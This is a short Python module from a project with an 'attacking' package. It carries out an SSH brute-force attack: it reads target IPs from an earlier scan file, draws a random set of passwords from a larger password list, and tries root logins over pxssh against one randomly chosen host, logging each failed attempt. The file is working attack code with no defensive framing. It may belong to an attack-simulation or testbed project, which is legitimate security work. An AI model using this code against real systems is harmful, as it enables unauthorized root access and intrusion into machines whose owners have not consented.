#
# Copyright (C) 2022 Alexandre Mitsuru Kaihara
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#


from packages.system.echoX import echoC
import os
import sys
import random
import time
import platform

if platform.system() == "Linux":
	from pexpect import pxssh
#else:
#	return -1


ipList = 'packages/attacking/ipList.txt'
pwList = 'packages/attacking/password.txt'
pwSourceList = 'packages/attacking/password-long.txt'

# Read the IPs from the last scan 
def getIPList():
	try:
		with open(ipList) as f:
			content = [x.strip('\n') for x in f.readlines()]
	except Exception as e:
		echoC(__name__, "No IPs scanned yet, so no BruteForce attack possible: " + str(e))
		content = -1
	return content

# Select 2000 passwords 
def generatePasswordList(amount):
	try:
	
		# Read big password file 
		allPWs = open(pwSourceList).readlines()
		
		# Write passwords to test 
		with open(pwList, "w") as f:
			for i in range(0, amount):
				f.write(random.choice(allPWs))
		
	except Exception as e:
		echoC(__name__, "Error creating pwList: " + str(e))
		return -1

	return 0

def main(noOfPWs):

	echoC(__name__, "Starting a brute-force attack with " + str(noOfPWs) + " passwords")
	
	# Read the IPs from the last scan 
	ips = getIPList()
	if ips == -1:
		return -1
		
	# Generate password file 
	generatePasswordList(noOfPWs)
		
	# Select a random IP 
	rand = random.randint(0, len(ips)-1)
	ip = ips[rand]
	echoC(__name__, "Trying to Connect to " +  str(ip))

	# Open file with passwords and execute a brute force attack 
	try:
		with open(pwList) as f:
			for line in f:
				try:
					s = pxssh.pxssh()
					s.login(ip, 'root', str(line).split("\n")[0])
					s.logout()
				except pxssh.ExceptionPxssh as e:
					echoC(__name__, "Tried '" + line.split("\n")[0] + "': " + str(e))
	except Exception as e:
		echoC(__name__, "Error during brute-force: " +  str(e))
		return -1
			
	echoC(__name__, "Done")
	
	returnval = "0," + str(ip)
	return returnval

if __name__ == "__main__":
	main(sys.argv[1])
